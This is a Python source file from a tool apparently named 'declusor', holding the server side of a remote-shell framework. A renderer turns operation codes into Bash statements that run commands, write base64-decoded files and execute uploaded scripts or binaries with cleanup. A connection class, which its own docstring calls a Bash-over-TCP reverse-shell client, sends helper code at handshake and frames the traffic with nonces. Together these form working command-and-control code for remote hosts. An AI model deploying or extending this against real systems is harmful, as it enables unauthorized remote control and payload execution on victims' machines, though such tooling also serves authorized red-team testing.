from collections.abc import Callable, Generator
from dataclasses import dataclass, field
from typing import Final

from declusor import config, contract, util


@dataclass(frozen=True)
class ShellSocketRenderer(contract.IOperationRenderer):
    """Translates OperationCode values to Bash shell command strings.

    Composes primitive helper calls (storage, execution, encoding) into
    executable Bash shell statements evaluated by the client launcher. This
    renderer is pure data — it never performs I/O.
    """

    _supported_operations: Final[frozenset[config.OperationCode]] = field(
        default_factory=lambda: frozenset(
            {
                config.OperationCode.EXEC_COMMAND,
                config.OperationCode.EXEC_CODE,
                config.OperationCode.EXEC_FILE,
                config.OperationCode.STORE_FILE,
                config.OperationCode.LOAD_MODULE,
            }
        )
    )
    """Set of operation codes supported by this renderer."""

    def __post_init__(self) -> None:
        object.__setattr__(self, "_supported_operations", frozenset(self._supported_operations))

    @property
    def supported_operations(self) -> frozenset[config.OperationCode]:
        """Set of supported operation codes."""

        return self._supported_operations

    def render_operation_command(self, opcode: "config.OperationCode", /, *args: str) -> str | None:
        """Build the shell execution statement for a given operation code."""

        if opcode not in self._supported_operations:
            return None

        match opcode:
            case config.OperationCode.EXEC_COMMAND:
                return self._render_exec_command(*args)
            case config.OperationCode.EXEC_CODE:
                return self._render_exec_code(*args)
            case config.OperationCode.STORE_FILE:
                return self._render_store_file(*args)
            case config.OperationCode.EXEC_FILE | config.OperationCode.LOAD_MODULE:
                return self._render_payload_execution(*args)
            case _:
                return None

    def _render_exec_command(self, *args: str) -> str:
        """Render shell command execution statement."""

        return args[0].rstrip("\r\n") if args else ""

    def _render_exec_code(self, *args: str) -> str:
        """Render shell code execution statement."""

        return args[0].rstrip("\r\n") if args else ""

    def _render_store_file(self, *args: str) -> str | None:
        """Render file storage statement decoding base64 payload."""

        if not args:
            return None

        data_b64 = args[0]

        if len(args) > 1 and args[1]:
            return f"decode_b64 {util.quote(data_b64)} | store_file {util.quote(args[1])}"

        return f"decode_b64 {util.quote(data_b64)} | store_file"

    def _render_payload_execution(self, *args: str) -> str | None:
        """Render executable payload statement detecting script vs binary."""

        if not args:
            return None

        data_b64 = args[0]
        extra_args = (" " + " ".join(util.quote(a) for a in args[1:])) if len(args) > 1 else ""

        try:
            raw_bytes = util.convert_base64_to_bytes(data_b64)
            raw_bytes.decode("utf-8")

            return f'execute_source "$(decode_b64 {util.quote(data_b64)})"{extra_args}'
        except UnicodeDecodeError:
            return f'execute_binary --cleanup "$(decode_b64 {util.quote(data_b64)} | store_file)"{extra_args}'
        except Exception:
            return f'execute_source "$(decode_b64 {util.quote(data_b64)})"{extra_args}'


class ShellSocketConnection(contract.IConnection):
    """``IConnection`` implementation for a Bash-over-TCP reverse-shell client."""

    DEFAULT_BUFFER_SIZE: Final[int] = 2**8
    """Size of the buffer to use when reading from the socket. Must be > 0."""

    def __init__(
        self,
        transport: contract.ITransport,
        renderer: contract.IOperationRenderer,
        files: contract.IPluginProcessor,
        /,
        *,
        buffer_size: int = DEFAULT_BUFFER_SIZE,
        fixed_nonce: str | None = None,
        nonce_factory: Callable[[], str] = util.generate_nonce,
        timeout: float | None = config.DEFAULT_CONNECTION_TIMEOUT,
    ) -> None:
        if buffer_size <= 0:
            raise config.ConnectionError("buffer_size must be > 0")

        self._transport = transport
        self._renderer = renderer
        self._files = files
        self._buffer_size = buffer_size
        self._fixed_nonce = fixed_nonce
        self._nonce_factory = nonce_factory
        self._state = contract.ConnectionState.CREATED
        self._current_nonce: str | None = fixed_nonce

        if timeout is not None:
            self._transport.timeout = timeout

    @property
    def state(self) -> contract.ConnectionState:
        """Current lifecycle state of the connection."""

        return self._state

    @property
    def renderer(self) -> contract.IOperationRenderer:
        """The connection operation renderer."""

        return self._renderer

    @property
    def current_nonce(self) -> str | None:
        """The active ephemeral nonce for the current or most recent command."""

        return self._current_nonce

    @property
    def timeout(self) -> float | None:
        """Current transport timeout in seconds."""

        return self._transport.timeout

    @timeout.setter
    def timeout(self, value: float | None) -> None:
        self._transport.timeout = value

    @property
    def delim(self) -> bytes:
        return f"__DECLUSOR_EOF_{self._current_nonce}__".encode("ascii")

    def handshake(self) -> None:
        """Perform the client initialization handshake."""

        self.ensure_can_handshake()

        self._state = contract.ConnectionState.INITIALIZING
        self.write(self._files.helpers)

        try:
            for _ in self.read():
                pass
        except (config.ConnectionClosed, config.ConnectionTimeoutError, config.ConnectionError) as error:
            raise config.ConnectionHandshakeError("Failed waiting for client handshake envelope.") from error

        self._state = contract.ConnectionState.CONNECTED

    def write(self, data: bytes, /, *, nonce: str | None = None) -> None:
        """Send data to the remote client enclosed in an ephemeral transaction envelope."""

        self.ensure_can_perform_io()

        self._current_nonce = nonce or self._fixed_nonce or self._nonce_factory()
        payload = self._current_nonce.encode("ascii") + b"\x00" + data + b"\x00"

        try:
            self._transport.write(payload)
        except (config.ConnectionClosed, config.ConnectionTimeoutError, config.ConnectionError) as error:
            raise config.ConnectionError(f"Failed to write to connection: {error}") from error

    def read(self) -> Generator[bytes, None, None]:
        """Stream response chunks from the client until the ephemeral envelope delimiter."""

        self.ensure_can_perform_io()

        if not self._current_nonce:
            raise config.ConnectionError("No active command nonce for read operation.")

        buffer = bytearray()

        while True:
            try:
                chunk = self._transport.read(self._buffer_size)
            except (config.ConnectionClosed, config.ConnectionTimeoutError, config.ConnectionError) as error:
                raise config.ConnectionClosed(f"Connection interrupted during read: {error}") from error

            if not chunk:
                raise config.ConnectionClosed("Connection closed by client during response stream.")

            buffer.extend(chunk)

            while True:
                pos = buffer.find(self.delim)

                if pos == -1:
                    break

                if pos > 0:
                    yield bytes(buffer[:pos])

                buffer = buffer[pos + len(self.delim) :]

                if buffer.startswith(b"\n"):
                    buffer = buffer[1:]

                return

            if len(buffer) > len(self.delim):
                yield bytes(buffer[: -len(self.delim)])
                buffer = buffer[-len(self.delim) :]

    def __enter__(self) -> "ShellSocketConnection":
        return self

    def __exit__(self, *_: object) -> None:
        self.close()

    def close(self) -> None:
        """Close the underlying transport idempotently."""

        if self.is_closed:
            return

        self._state = contract.ConnectionState.CLOSED
        self._transport.close()


DEFAULT_SHELL_SOCKET = ShellSocketRenderer()
